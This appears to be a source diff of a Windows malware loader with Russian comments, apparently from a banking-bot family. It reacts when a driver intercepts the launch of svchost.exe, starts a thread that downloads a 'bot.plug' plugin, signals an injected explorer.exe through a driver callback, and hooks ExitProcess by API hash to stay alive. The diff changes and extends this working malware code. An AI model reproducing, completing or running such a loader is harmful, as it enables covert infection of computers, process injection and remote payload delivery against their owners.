@@ -22,7 +22,7 @@ namespace LDRDEBGTEMPLATES
 //----------------------------------------------------------------------------
 
 
-PCHAR SVChostName = "svchost.exe";
+PWCHAR SVChostName = L"svchost.exe";
 char BotPlugin[] = {'b', 'o', 't', '.', 'p', 'l', 'u', 'g',  0};
 
 
@@ -44,6 +44,7 @@ namespace DLLLoader
 	PCHAR GetSignalFileName()
 	{
 		// Функция возвращает имя сигнального файла
+
 
 		// Определяем системный диск
 		char WinDir[257];
@@ -100,30 +101,36 @@ namespace DLLLoader
 
 	DWORD WINAPI DownloadMethod(LPVOID Data)
 	{
-		
+
        	// Функция загрузки плагина
 		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
 		
 		LDRDBG("BRDS", "Отключаем слежение за процессом svchost.exe \r\n");
-		if (!DriverRemoveInjectToProcess(InitData, SVChostName))
-		{
-			LDRDBG("BRDS", "Не удалось отключить слежение \r\n");
-		}
+
+		DriverRemoveInjectToProcess(InitData, SVChostName);
+
 
 		#ifdef DebugUtils
-			DWORD Max = 15;
-			for (DWORD i = 0; i < Max; i++)
+			for (DWORD i = 15; i > 0; i--)
 			{
-				LDRDBG("BRDS", "Ждём %d \r\n", DWORD(Max - i));
+				LDRDBG("BRDS", "Ждём %d \r\n", i);
 				pSleep(1000);
+			}
+		#else
+			while (1)
+			{
+					WSADATA wsa;
+					ClearStruct(wsa);
+					DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
+					if (Code == 0)
+						break;
+					else
+						return 0; //pSleep(500);
 			}
 		#endif
 		
 		LDRDBG("BRDS", "Запуск загрузки плагина бота (V 10) \r\n");
 
-				
-
-		bool CallEventAfterDownload = true; //!FileExistsA(FileName);
 
 		DWORD Size = 0;
 		LPVOID Module = NULL;
@@ -131,8 +138,7 @@ namespace DLLLoader
 
 		//Загружаем библиотеку
 
-//		LDRDBG("BRDS", "Инициализируем загрузку плагина!");
-
+		LDRDBG("BRDS", "Инициализируем загрузку плагина!");
 
 		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
 
@@ -141,20 +147,20 @@ namespace DLLLoader
 			// Сохраняем данные в кэш
 			LDRDBG("BRDS", "Бот успешно загружен \r\n");
 
+
             MemFree(Module);
 
-			
 			// передаем прочитанную длл в драйвер	
 			// добавляем модуль для инжекта в процесс диспетчера задач
 
 			// Уведомляем експлорер об успешной загрузке длл
-			if (CallEventAfterDownload)
-			{
-            	LDRDBG("BRDS", "Уведомляем эксплорер \r\n");
-				WaitExplorer();
-				PCHAR Buf = "Ok: ";
-				DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
-			}
+        	LDRDBG("BRDS", "Уведомляем эксплорер \r\n");
+
+			WaitExplorer();
+
+
+			PCHAR Buf = "Ok: ";
+			DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
 		}
 
 		ThreadHandle = NULL; // Идентификатор потока нас больше не интересует
@@ -199,7 +205,7 @@ namespace DLLLoader
 		// эавершение процесса до завершения работы нашего
 		// потока
 		//===================================================
-		if ( HookApi(1, 0x95902B19 /* ExitProcess */, &Hook_ExitProcess ) )
+		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
 			__asm mov [Real_ExitProcess], eax
 
 
@@ -212,6 +218,7 @@ namespace DLLLoader
 			pCloseHandle(H);
 			return false;
         }
+		pSetThreadPriority(ThreadHandle, THREAD_PRIORITY_NORMAL);
 
 		return true;
     }
@@ -393,14 +400,17 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 
 	if (Hash == 0x2608DF01 /* svchost.exe */)
 	{
-		PCHAR CL = (PCHAR)pGetCommandLineA();
 
+		PCHAR CL = (PCHAR)pGetCommandLineA();
 
 		LDRDBG("BRDS", "Драйвер перехватил запуск процесса svchost.exe \r\n");
 		LDRDBG("BRDS", "Командная строка svchost.exe - %s \r\n", CL);
 
-		//if (STR::Pos(CL, "-k LocalService") >= 0)
+	//	if (STR::Pos(CL, "localservice", 0, false) >= 0)
+		{
+
 			DLLLoader::StartLoaderThread(SystemArgument1);
+		}
 	}
 	if (Hash == 0x490A0972 /* explorer.exe */)
 	{
